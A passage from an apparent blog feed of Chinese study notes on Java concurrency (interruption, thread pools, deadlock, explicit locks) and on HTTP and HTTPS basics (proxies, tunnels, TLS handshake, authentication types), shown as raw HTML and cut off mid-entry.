class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimeProducer</span> <span class="keyword">extends</span>  <span class="title">Thread</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> BlockingQueue&lt;BigInteger&gt; queue;</span><br><span class="line"></span><br><span class="line">    PrimeProducer(BlockingQueue&lt;BigInteger&gt; queue)&#123;</span><br><span class="line">        <span class="keyword">this</span>.queue=queue;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            BigInteger p=BigInteger.ONE;</span><br><span class="line">            <span class="keyword">while</span> (!Thread.currentThread().isInterrupted())&#123;</span><br><span class="line">                queue.put(p=p.nextProbablePrime());;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InterruptedException consumed)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">cancel</span><span class="params">()</span></span>&#123;</span><br><span class="line">        interrupt();<span class="comment">//取消 使得线程中断</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="7-1-2-中断策略"><a href="#7-1-2-中断策略" class="headerlink" title="7.1.2 中断策略"></a>7.1.2 中断策略</h4><p><strong>中断策略规定线程如何解释某个中断请求——当发现中断请求时，应该做哪些工作，哪些中作单元对于中断来说时原子操作，以及以多块的速度来响应中断。</strong></p><h4 id="7-1-3-响应中断"><a href="#7-1-3-响应中断" class="headerlink" title="7.1.3 响应中断"></a>7.1.3 响应中断</h4><p>当调用可中断的阻塞函数时，如<strong>Thread.sleep或BlockingQueue.put等，有两种策略处理InterruptedException</strong>:</p><ol><li><strong>传递异常</strong>（可能再执行某个特定于任务的清除操作之后），从而使方法也成为可中断的阻塞方法。</li><li><strong>恢复中断状态</strong>，从而使调用栈中的上层代码能够对其进行处理。</li></ol><p>如果不想或无法传递InterruptedException，另一种方法就是通过调用interrupt来恢复中断状态。<strong>不能屏蔽InterruptedException，例如再catch块中捕获到异常却不做任何处理，除非在你的代码中实现了线程的中断策略。</strong></p><p><strong>通常，可中断的方法会在阻塞或进行重要的工作前首先检查中断，从而尽快响应中断。</strong></p><h4 id="7-1-5-通过Future来实现取消"><a href="#7-1-5-通过Future来实现取消" class="headerlink" title="7.1.5 通过Future来实现取消"></a>7.1.5 通过Future来实现取消</h4><p>Future拥有一个cancel方法，该方法带有一个boolean类型的参数mayInterruptIfRunning，表示取消操作是否成功。（这只表示任务是否能接受中断，而不是表示任务是否能检测并处理中断。）</p><p>如果mayInterruptIfRunning为true并且任务当前正在某个线程中运行，那么这个线程能被中断。</p><p>如果为false，表示任务还没启动，就不要运行它，这种方式应该用于哪些不处理中断的任务。</p><h4 id="7-1-7-采用newTaskFor来封装非标准的取消"><a href="#7-1-7-采用newTaskFor来封装非标准的取消" class="headerlink" title="7.1.7 采用newTaskFor来封装非标准的取消"></a>7.1.7 采用newTaskFor来封装非标准的取消</h4><h3 id="7-2-停止基于线程读服务"><a href="#7-2-停止基于线程读服务" class="headerlink" title="7.2 停止基于线程读服务"></a>7.2 停止基于线程读服务</h3><p><strong>线程由Thread对象表示，并且像其他对象一样可以被自由共享。然而，线程有一个相应的持有者，即创建该线程的类。因此线程池是其工作者线程的所有者，如果要中断这些线程，那么应该使用线程池。</strong></p><p>应用程序可以拥有服务，服务也可以拥有工作者线程，但应用程序不能拥有工作线程。<strong>服务应该提供生命周期方法来关闭它自己以及它所拥有的线程。</strong>对于持有线程的服务，只要服务的存在时间大于创建线程的方法的存在时间，那么就应该提供生命周期方法。</p><h4 id="7-2-2-关闭ExecutorService"><a href="#7-2-2-关闭ExecutorService" class="headerlink" title="7.2.2 关闭ExecutorService"></a>7.2.2 关闭ExecutorService</h4><h4 id="7-2-3-毒丸对象"><a href="#7-2-3-毒丸对象" class="headerlink" title="7.2.3 毒丸对象"></a>7.2.3 毒丸对象</h4><p>毒丸：一个放在队列上的对象，当得到这个对象，立即停止。通过该方式保证再关闭之前首先完成队列中的所有工作，生产者再提交了毒丸对象后，将不会再提交任何工作。</p><p>只有再生产者和消费者的数量都已知的情况下，才可以使用毒丸对象。只有再无界队列中，毒丸对象才能可靠地工作。</p><h4 id="7-2-5-ExecutorService中shutdown的局限"><a href="#7-2-5-ExecutorService中shutdown的局限" class="headerlink" title="7.2.5 ExecutorService中shutdown的局限"></a>7.2.5 ExecutorService中shutdown的局限</h4><p>shoutdown强行关闭executorService,尝试取消正在执行的任务，返回所有已提交尚未开始的任务(List<Runnable>)</p><p>因此我们无法知道哪些任务已经开始但是尚未结束。</p><h3 id="7-3-处理非正常的线程终止"><a href="#7-3-处理非正常的线程终止" class="headerlink" title="7.3 处理非正常的线程终止"></a>7.3 处理非正常的线程终止</h3><p>导致线程死亡的最主要原因就是RuntimeException。由于这种异常表示出现了某种编程错误或者其他不可修复的错误，因此他们通常不会捕获，他们不会再调用栈中逐层传递，而是默认地再控制台中输出栈追踪消息，并终止线程。</p><p>UncaughtExceptionHandler,能检测出某个线程由于未捕获的异常而终结的情况。<strong>通过它与主动方法来检查未检异常，就能有效的防止线程泄露情况</strong></p><h3 id="7-4-JVM关闭"><a href="#7-4-JVM关闭" class="headerlink" title="7.4 JVM关闭"></a>7.4 JVM关闭</h3><p>JVM既可以正常关闭，也可以强行关闭。</p><p>这一部分查看深入理解JVM</p><p>正常关闭：</p><ol><li>当最后一个正常（非守护）线程结束时</li><li>调用了System.exit时</li></ol><p>强行关闭：</p><ol><li>Runtime.halt</li><li>再操作系统中杀死JVM进程</li></ol><h4 id="7-4-1-关闭钩子"><a href="#7-4-1-关闭钩子" class="headerlink" title="7.4.1 关闭钩子"></a>7.4.1 关闭钩子</h4><h4 id="7-4-2-守护线程"><a href="#7-4-2-守护线程" class="headerlink" title="7.4.2 守护线程"></a>7.4.2 守护线程</h4><h2 id="8-线程池的使用"><a href="#8-线程池的使用" class="headerlink" title="8.线程池的使用"></a>8.线程池的使用</h2><h4 id="8-1-1-线程饥饿死锁"><a href="#8-1-1-线程饥饿死锁" class="headerlink" title="8.1.1 线程饥饿死锁"></a>8.1.1 线程饥饿死锁</h4><p>线程池中，如果任务依赖于其他任务，那么可能产生死锁。</p><p><strong>线程饥饿死锁</strong>：只要线程池中的任务需要无限期地等待一些必须由池中其他任务才能提供的资源或条件，除非线程池足够大，否则将发生线程饥饿死锁。</p><blockquote><p>每当提交一个由依赖性的Executor任务时，要清楚地知道可能会出现线程“饥饿”死锁，因此需要在代码或配置Executor的配置文件中记录线程池的大小限制或配置限制。</p></blockquote><h3 id="8-2设置线程池的大小"><a href="#8-2设置线程池的大小" class="headerlink" title="8.2设置线程池的大小"></a>8.2设置线程池的大小</h3><p>线程 池的大小取决于被提交任务的类型以及所部署系统的特性。代码中不会固定线程池的大小，而是应该通过某种配置机制来提供，或者<strong>通过Runtime.getRuntime().availableProcessors();来动态计算。</strong></p><h3 id="8-3-配置ThreadPoolExecutor"><a href="#8-3-配置ThreadPoolExecutor" class="headerlink" title="8.3 配置ThreadPoolExecutor"></a>8.3 配置ThreadPoolExecutor</h3><p>ThreadPoolExecutor为一些Executor提供了基本的实现。</p><p>ThreadPoolExecutor是一个灵活的、稳定的线程池，允许进行各种定制。</p><h4 id="8-3-1-线程的创建与销毁"><a href="#8-3-1-线程的创建与销毁" class="headerlink" title="8.3.1 线程的创建与销毁"></a>8.3.1 线程的创建与销毁</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadPoolExecutor</span><span class="params">(<span class="keyword">int</span> corePoolSize,//线程池的基本大小</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> maximumPoolSize,//最大大小</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">long</span> keepAliveTime,//存活时间</span></span></span><br><span class="line"><span class="function"><span class="params">                              TimeUnit unit,</span></span></span><br><span class="line"><span class="function"><span class="params">                              BlockingQueue&lt;Runnable&gt; workQueue,</span></span></span><br><span class="line"><span class="function"><span class="params">                              RejectedExecutionHandler handler)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue,</span><br><span class="line">             Executors.defaultThreadFactory(), handler);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>基本大小也就是线程池的目标大小，即在没有任务执行时线程池的大小，并且只有在工作队列满了的情况下才会创建超出这个数量的线程。线程的最大大小表示可同时活动的线程数量。</p><p><strong>包括newFixedThreadPool工厂方法底层都是由ThreadPoolExecutor实现的。</strong></p><p>对于Executor，newCachedThreadPool工厂方法是一种很好的默认选择，能提供比固定大小的线程池更好的排队性能。只有当任务相互独立时，为线程池或工作队列设置界限才是合理的。如果任务之间存在有依赖性，那么有界的线程池或队列就可能导致线程“饥饿”死锁问题。<strong>此时应该使用无界的线程池，例如newCachedThreadPool</strong>.</p><h4 id="8-3-3-饱和策略"><a href="#8-3-3-饱和策略" class="headerlink" title="8.3.3 饱和策略"></a>8.3.3 饱和策略</h4><h4 id="8-3-4-线程工厂"><a href="#8-3-4-线程工厂" class="headerlink" title="8.3.4 线程工厂"></a>8.3.4 线程工厂</h4><p>每当线程池需要创建一个线程时，都是通过线程工厂方法来完成的。默认的线程工厂方法将创建一个新的、非守护的线程，并且不含特殊的配置信息。通过指定一个线程工厂方法，可以定制线程池的配置信息。</p><h3 id="8-4-扩展ThreadPoolExecutor"><a href="#8-4-扩展ThreadPoolExecutor" class="headerlink" title="8.4 扩展ThreadPoolExecutor"></a>8.4 扩展ThreadPoolExecutor</h3><p>ThreadPoolExecutor提供了几个可以在子类中改写的方法。</p><ol><li>beforeExecute</li><li>afterExecutor</li><li>terminated</li></ol><h2 id="10-避免活跃性危险"><a href="#10-避免活跃性危险" class="headerlink" title="10.避免活跃性危险"></a>10.避免活跃性危险</h2><p><strong>完全性问题</strong>：由于多个线程要共享相同的内存地址空间，并且是并发运行的，因此可能会访问或修改其他线程正在使用的变量。<strong>线程会由于无法预料的数据变化而发生错误。</strong></p><p><strong>活跃性问题</strong>：当某个操作无法继续执行下去时，就会发生活跃性问题。例如死锁、饥饿、活锁等问题。</p><h3 id="10-1-死锁"><a href="#10-1-死锁" class="headerlink" title="10.1 死锁"></a>10.1 死锁</h3><p><strong>死锁</strong>：每个人都拥有其他其他人需要的资源，同时又等待其他人已经拥有的资源，并且每个人在获得所有需要的资源之前都不会放弃已经拥有的资源。</p><p><strong>抱死</strong>：多线程由于存在环路的锁依赖关系而永远地等待下去。</p><p>JVM在解决死锁问题方面没有数据库那么强大。当JAVA线程发生死锁时，这些线程永远不能再使用了。</p><h4 id="10-1-1-锁顺序死锁"><a href="#10-1-1-锁顺序死锁" class="headerlink" title="10.1.1 锁顺序死锁"></a>10.1.1 锁顺序死锁</h4><p>当所有线程以固定的顺序来获得锁，那么在程序中就不会出现锁顺序死锁问题。</p><h4 id="10-1-2-动态的锁顺序死锁"><a href="#10-1-2-动态的锁顺序死锁" class="headerlink" title="10.1.2 动态的锁顺序死锁"></a>10.1.2 动态的锁顺序死锁</h4><p>所有的线程似乎都是按相同的顺序来获得锁，但事实上的锁的顺序取决于传入方法的参数顺序。这些参数顺序又取决于外部输入。</p><h4 id="10-1-3-协作对象之间发生的死锁"><a href="#10-1-3-协作对象之间发生的死锁" class="headerlink" title="10.1.3 协作对象之间发生的死锁"></a>10.1.3 协作对象之间发生的死锁</h4><p>如果在持有锁时调用某个外部方法，那么将出现活跃性问题。在这个外部方法中可能会获取其他锁，或者阻塞时间过长，导致其他线程无法及时获得当前被持有的锁。</p><h4 id="10-1-4-开放调用"><a href="#10-1-4-开放调用" class="headerlink" title="10.1.4 开放调用"></a>10.1.4 开放调用</h4><p><strong>开放调用</strong>：在调用某个方法时不需要持有锁，那么这种调用被称为开放调用。</p><p>这种通过开放调用来避免死锁的方法，类似于采用封装机制来提供线程安全的方法。</p><p><strong>单单使用同步代码块来保护那些涉及共享状态的操作，而不是在一整个方法上加锁。</strong></p><p>程序中应尽量使用开放调用。与那些在持有锁时调用外部方法的程序相比，更容易对依赖于开放调用的程序进行死锁分析。</p><h4 id="10-1-5-资源死锁"><a href="#10-1-5-资源死锁" class="headerlink" title="10.1.5 资源死锁"></a>10.1.5 资源死锁</h4><p>当多个线程在相同的资源集合上等待时，也会发生死锁。</p><p>例如等待两个任务等待两个数据库的连接，两个资源不会遵循相同的顺序，一次可能发生死锁。</p><h3 id="10-2-死锁的避免与诊断"><a href="#10-2-死锁的避免与诊断" class="headerlink" title="10.2 死锁的避免与诊断"></a>10.2 死锁的避免与诊断</h3><p>在使用细粒度锁的程序中，通过使用一种两阶段策略来检查代码中的死锁：</p><ol><li>首先，找出在什么地方将获取多个锁（使得这个集合尽量小）</li><li>对所有的实例进行全局分析，确保在整个程序中获取锁的顺序都保持一致。</li></ol><h4 id="10-2-1-支持定时的锁"><a href="#10-2-1-支持定时的锁" class="headerlink" title="10.2.1 支持定时的锁"></a>10.2.1 支持定时的锁</h4><p>显式使用Lock类中的定时tryLock功能来代替内置锁机制。当使用内置锁时，只要没有获得锁，就会永远等待下去，而显式锁则而可以指定一个超时时限，在等待超过该时间后tryLock后会返回一个失败信息。如果超时时限比获取锁的时间要长很多，那么就可以在发生某个意外情况后重新获得控制权。</p><p>这项技术只有在同时获取两个锁时才有效，如果在嵌套的 方法调用中请求多个锁，那么即使你已经持有了外层的锁，也无法释放它。</p><h3 id="10-3-其他活跃性问题"><a href="#10-3-其他活跃性问题" class="headerlink" title="10.3 其他活跃性问题"></a>10.3 其他活跃性问题</h3><h4 id="10-3-1-饥饿"><a href="#10-3-1-饥饿" class="headerlink" title="10.3.1 饥饿"></a>10.3.1 饥饿</h4><p>当线程由于无法访问它所需要的资源而不能继续执行时，就发生了饥饿。引发饥饿的最常见资源就是CPU时钟周期。</p><p>应该避免使用线程优先级，这会增加平台依赖性，导致活跃性问题。</p><h4 id="10-3-2-糟糕的响应性"><a href="#10-3-2-糟糕的响应性" class="headerlink" title="10.3.2 糟糕的响应性"></a>10.3.2 糟糕的响应性</h4><h4 id="10-3-3-活锁"><a href="#10-3-3-活锁" class="headerlink" title="10.3.3 活锁"></a>10.3.3 活锁</h4><p>当多个相互协作的线程都对彼此进行响应从而修改各自的状态。并使得任何一个线程都无法继续执行时，就发生了活锁。</p><h2 id="13-显式锁"><a href="#13-显式锁" class="headerlink" title="13.显式锁"></a>13.显式锁</h2><p>java5.0之前协调对共享对象的访问时可以使用的机制只有synchronized和volatile。<strong>JAVA5.0新增了一种新的机制：ReentrantLock</strong>。</p><p>ReentrantLock并不是一种替代内置加锁的方法，而是当内置加锁机制不适用时，作为一种可选的高级功能。</p><h3 id="13-1-Lock-与ReentrantLock"><a href="#13-1-Lock-与ReentrantLock" class="headerlink" title="13.1 Lock 与ReentrantLock"></a>13.1 Lock 与ReentrantLock</h3><p>与内置解锁机制不同的是,Lock提供了一种无条件的、可轮询的、定时的以及可中断的锁获取操作，所有加锁和解锁的方法都是显式的。</p><p>ReentrantLock实现了Lock接口，提供了与synchronized相同的互斥性和内存可见性。与synchronized一样，提供了可重入的加锁。</p><p><strong>为什么要创建一种与内置锁如此相似的新加锁机制？</strong></p><p>大多数情况下，内置锁都能很好地工作，但在功能上存在一些局限性，如：</p><ol><li>无法中断一个正在等待获取锁的线程</li><li>无法在请求获取一个锁时无限地等待下去</li><li>内置锁必须在获取锁的代码块中释放，无法实现非阻塞结构的加锁机制</li></ol><p>RenntrantLock不能完全替代synchronized的原因是：它更加危险，当程序的执行控制离开被保护的代码时，不会自动清除锁。</p><h4 id="13-1-1-轮询锁与定时锁"><a href="#13-1-1-轮询锁与定时锁" class="headerlink" title="13.1.1 轮询锁与定时锁"></a>13.1.1 轮询锁与定时锁</h4><p>可定时的与可轮询的锁获取模式是由tryLock实现的，与无条件的锁获取模式相比，它具有更完善的错误恢复机制。</p><p><strong>可以有效的避免死锁的发生。</strong></p><p>如果不能获得所有需要的锁，那么可以使用可定时的活可轮询的锁获取方式，从而使你重新获得控制权，它会释放已经获得的锁，然后重新尝试获取所有锁。</p><h4 id="13-1-2-可中断的锁获取操作"><a href="#13-1-2-可中断的锁获取操作" class="headerlink" title="13.1.2 可中断的锁获取操作"></a>13.1.2 可中断的锁获取操作</h4><p>正如定时的锁获取操作能在有时间限制的操作中使用独占锁，可中断的锁获取操作同样能在可取消的操作中使用加锁。</p><p>lockInterruptibly方法能够在获取锁的同时保持对中断的响应。</p><p>tryLock可用于实现一个定时的和可中断的锁获取操作。</p><h3 id="13-3-公平性"><a href="#13-3-公平性" class="headerlink" title="13.3 公平性"></a>13.3 公平性</h3><p>创建ReentrantLock锁时构造函数中提供了两种公平性选择：</p><ol><li><p>非公平的锁（默认）</p><p>允许插队，当一个线程请求非公平的锁时，如果在发出请求的同时该锁的状态变为可用，那么这个线程将跳过队列中所有的等待线程并获得这个锁。</p></li><li><p>公平的锁</p><p>线程将按照他们发出的请求的顺序来获得锁</p></li></ol><p>非公平的锁的性能往往高于公平锁的性能：恢复一个被挂起的线程与该线程真正开始运行之间存在着严重的延迟。</p><h3 id="13-4-synchronized和ReentrantLock之间进行选择"><a href="#13-4-synchronized和ReentrantLock之间进行选择" class="headerlink" title="13.4 synchronized和ReentrantLock之间进行选择"></a>13.4 synchronized和ReentrantLock之间进行选择</h3><p>ReentrantLock在加锁和内存上提供的语义与内置锁相同，还提供其他包括锁等待、可中断的锁等待、公平性以及实现非块结构的加锁。</p><h3 id="13-5-读——写锁"><a href="#13-5-读——写锁" class="headerlink" title="13.5 读——写锁"></a>13.5 读——写锁</h3><p>ReentrantLock实现了一种标准的互斥锁，每次最多只有一个线程能持有ReentrantLock。对于维护数据的完整性来说，不必要地限制了并发性。</p><p><strong>读——写锁</strong>：<strong>一个资源可以被多个读操作访问，或者被一个写操作访问，但两者不能同时进行。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ReadWriteLock</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the lock used for reading.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the lock used for reading</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Lock <span class="title">readLock</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Returns the lock used for writing.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the lock used for writing</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Lock <span class="title">writeLock</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读——写锁允许多个读线程并发地访问被保护的对象，当访问以读取操作为主的数据结构时，它能提高程序的可伸缩性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JAVA并发编程&quot;&gt;&lt;a href=&quot;#JAVA并发编程&quot; class=&quot;headerlink&quot; title=&quot;JAVA并发编程&quot;&gt;&lt;/a&gt;JAVA并发编程&lt;/h1&gt;&lt;h2 id=&quot;2-线程安全性&quot;&gt;&lt;a href=&quot;#2-线程安全性&quot; class=&quot;header</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://a2914475618.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="并发编程" scheme="https://a2914475618.github.io/tags/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>图解HTTP</title>
    <link href="https://a2914475618.github.io/2021/11/10/%E5%9B%BE%E8%A7%A3HTTP/"/>
    <id>https://a2914475618.github.io/2021/11/10/%E5%9B%BE%E8%A7%A3HTTP/</id>
    <published>2021-11-10T07:52:07.000Z</published>
    <updated>2021-11-14T05:50:46.264Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h1><p>1、URI（uniform统一+resource资源+identifier标识符）</p><p>2、RFC（Request for comments)征求修改意见书   http协议的技术标准</p><p>3、http无状态协议，为了更快的处理大量事务，确保协议的可伸缩性</p><p>4、http 1.1引入了cookie技术 管理状态</p><p>5、方法</p><ul><li>head方法获得报文首部     </li><li>options询问支持的方法     </li><li>trace方法追踪路径  </li><li>connect   隧道协议连接代理 与代理服务器通信时建立隧道，实现用隧道进行Tcp通信</li></ul><p>6、SSL(Secure Sockets layer)安全套接字</p><p>7、TLS（Transport layer  Security)  传输层安全  协议</p><p>8、为了解决TCP多次建立增加通信量开销的问题，出现了持久连接</p><p>9、<strong>持久连接</strong>： 只要任意一端没有明确提出断开连接，则保证Tcp连接</p><p>10、http1.1中所有的连接默认都是<strong>持久连接</strong></p><p>11、<strong>持久连接</strong>使得多数请求以管线化方式发送成为可能</p><p>12、<strong>管线化技术</strong>：不需等待响应就可直接发送下一个请求。</p><p>13、服务器端发送的响应报文内的一个叫做Set-cookie的首部字段信息，通知客户端保存Cookie等于该值</p><p>14、压缩传输的内容编码：</p><ol><li>gzip（GNU zip)</li><li>compress(UNIX系统的标准压缩)</li><li>deflate(zlib)</li><li>identity(不进行编码)</li></ol><p>15、<strong>分块传输编码</strong>：在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面</p><p>16、MIME(Multipurpose Internet Mail Extensions) 多用途因特网邮件扩展它允许邮件处理文本、图片、视频等多个不同类型的数据。</p><p>17、HTTP协议采纳了多部份对象集合，一部分报文主体有多类型实体。通常在图片或文本文件等上传时使用。</p><ol><li>multipart/form-data  在web表单文件上传时使用</li><li>multipart/byteranges  状态码206，响应报文包含了多个范围的内容</li></ol><p>使用多部份对象集合时，需要在首部字段里加上Content-type</p><p>18、获取部分内容的<strong>范围请求</strong>：从下载中断处恢复下载</p><p>在首部使用Range字段</p><ol><li>Range:  bytes=5001-10000</li><li>Range:   bytes=5001-   到之后全部的</li></ol><p>针对范围请求  返回206状态码</p><p>19、状态码</p><ol><li>1XX   信息性状态码    接受的请求正在处理</li><li>2XX    成功状态码        正常处理完毕</li><li>3XX    重定向状态码    需要进行附加操作完成请求</li><li>4XX      客户端错误状态码      服务器无法处理请求</li><li>5XX       服务器错误状态码       服务器处理请求出错</li></ol><p>20、通信数据转发程序：代理、网关、隧道</p><p>21、<strong>代理</strong>：服务器和客户端的中间人，接受客户端的请求转发给服务器，接受服务器返回的响应给客户端。</p><p>理由：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的。</p><p>正向代理隐藏的是客户端（我无法直接访问它，我通过中间人来访问服务器，服务器不知道是谁发来的，VPN），反向代理隐藏的服务器（我只知道发给它，具体由谁负责我不知道）</p><p>代理有多种使用方法：</p><ol><li>是否使用缓存</li><li>是否会修改报文</li></ol><p><strong>缓存代理</strong>：</p><p>代理转发响应时，缓存代理会预先将资源的副本保存在代理服务器上。</p><p>当代理再次接受到对相同资源的请求时，可以不从源服务器获取资源，将之前的资源作为响应返回。</p><p><strong>透明代理</strong>：</p><p>转发请求或者响应时，不对报文做任何加工的代理类型称为透明代理。</p><p>对报文内容加工的称为非透明代理。</p><p>22、<strong>网关</strong>：转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像拥有资源的源服务器一样对请求进行处理。</p><p><strong>代理连接的是两个或多个使用相同协议的应用程序，而网关连接的则是两个或多个使用不同协议的应用程序。</strong></p><p><strong>网关扮演的是协议转换器的角色，即使客户端和服务端使用的是不同的协议，客户端也可以通过网关来和客户端进行交互</strong></p><p>23、<strong>隧道</strong>：在相隔甚远的客户端和服务器之间进行中转，并保持双方通信连接的应用程序。</p><p>建立一条与其他服务器通信的通信线路，可以使用SSL等加密手段通信。</p><p><strong>目的</strong>：确保客户端与服务器端进行安全的通信。</p><p>隧道不会解析http，请求保持原样中转给之后的服务器。</p><p>24、<strong>缓存指代理服务器或者客户端本地磁盘内保存的资源副本</strong>。可以减少对源服务器的访问。缓存服务器是代理服务器的一种，归类在缓存代理中。</p><p>当代理转发从服务器返回的响应时，代理服务器将会保存一份资源的副本。</p><p>25、<strong>http的不足</strong></p><ol><li>通信使用明文，内容可能被窃听</li><li>不验证通信方的身份，因此可能被伪装</li><li>无法证明报文的完整性，所以有可能篡改</li></ol><p>缺点一：</p><p><strong>解决方案</strong>：</p><p>1.<strong>通信的加密</strong></p><p>http中没有加密机制，但是可以用ssl建立安全通信线路之后，在该线路进行http通信。</p><p>https    =      http    +     ssl</p><p>2.<strong>内容的加密</strong></p><p>将http报文里所含的内容进行加密。要求客户端和服务器端都必须具有加密和解密机制。但是内容仍然有被篡改的可能。</p><hr><p>缺点二：</p><p>http协议简单，不确认通信方，会有以下隐患：</p><ol><li>有可能是已经伪装的服务器</li><li>有可能是已经伪装的客户端</li><li>无法确定正在通信的对方是否具备访问权限。</li><li>即使无意义的请求也会响应。无法阻止海量下的Dos攻击。</li></ol><p><strong>解决方案</strong>：</p><p>ssl不仅提供加密处理，而且还使用了<strong>证书</strong>，用于确定方。</p><p><strong>证书</strong>由第三方机构颁发，用以证明服务器和客户端是实际存在的。</p><hr><p>缺点三：</p><p>MITM(中间人攻击)    ：请求或者相应在传输中，遭到攻击者拦截并篡改内容的攻击。</p><p><strong>解决方案</strong>：</p><p>MD5和SHA-1等散列值校验的方法，以及用来确认文件的数字签名方法。</p><p>依然无法达到百分百的安全，因为PGP和MD5本身被改写。</p><p>26、<strong>HTTP+加密处理+认证+完整性保护=HTTPS</strong></p><p>HTTPS并非是应用层的一种新的协议。只是HTTP通信接口使用SSL和TLS协议代替而已。</p><p>原本是由HTTP直接和传输层的TCP直接通信。</p><p>现在是有HTTP和SSL通信，SSL在和TCP通信，相当于HTTP和TCP中间多了一层。ssl也在应用层。</p><p><strong>SSL</strong>采用<strong>公开密钥加密</strong>的加密处理方式、也称为非对称加密方式。</p><p><strong>共享密钥加密</strong>方式就是加密和解密都用同一个密钥，也成为堆成加密方式。</p><p>https<strong>采用混合密钥加密机制</strong>，在交换密钥环节使用公开密钥加密方式，之后建立的通信交换报文阶段则使用共享密钥加密方式。</p><p>为了证明公开密钥没有被篡改，使用由数字证书认证机构和其相关机关颁发的公开密钥证书。</p><p><strong>数字证书</strong>机构在判明申请者的身份后，会对已经申请的公开密钥做数字签名，然后分配这个已经签名的公开密钥，将该公开密钥放入公钥证书后绑定在一起。</p><p>公钥证书也叫做数字证书或者证书。</p><p>客户端证书进行客户端认证，证明服务器是真实存在的服务器。</p><hr><p><strong>https安全通信机制步骤</strong></p><ol><li>客户端发送报文开始通信。报文中有客户端支持的SSL的指定版本、加密组件列表（加密的算法以及密钥长度）</li><li>服务端可进行SSL通信时，发送报文作为响应。报文中包含SSL版本以及加密组件。该加密组件是从接受到的客户端加密组件内筛选出来的</li><li>服务器发送证书报文。包含公开密钥证书。</li><li>服务器发送报文通知客户端第一次SSL握手协商结束。</li><li>客户端确认证书的有效性，取出公开密钥，向服务端发送通过公开密钥已加密的随机密码串，告知服务器之后通信会采用该随机密码串密钥加密。</li><li>服务端使用私有密钥对客户端发来的报文取出已加密的随机密码串，解密。此后<strong>公开密钥加密结束</strong></li><li>向客户端确认通信会采用该随机密码串密钥加密。也就是<strong>共享加密</strong></li><li>客户端与服务端SSL建立成功后，<strong>以后的通信就使用对随机密码串解密后的随机数进行对称加密</strong></li></ol><p>SSL的慢</p><ol><li><p>通信的慢</p><p>和使用http比，网络负载变慢2到100倍，除去和TCP连接、发送HTTP请求响应以外，还必须进行SSL通信，整体上通信量增加。</p></li><li><p>大量消耗CPU及内存等资源，导致处理速度变慢</p><p>加密和解密消耗了硬件资源。</p></li></ol><p>为何不一直使用https？</p><ol><li>加密通信会消耗更多CPU及内存资源，使得每台计算机能处理的请求必定减少</li><li>敏感数据使用https，非敏感数据http</li><li>购买证书需要开销</li></ol><hr><p>http的基本认证</p><ol><li>basic认证（基本认证）</li><li>digest认证（摘要认证）</li><li>sll客户端认证</li><li>formBase认证（基于表单认证）</li></ol><p>basic认证即使用用户名密码通过Base64进行加密传给服务端验证，在报文中头部写入Authorization:Basic MTIzOjEyMw==   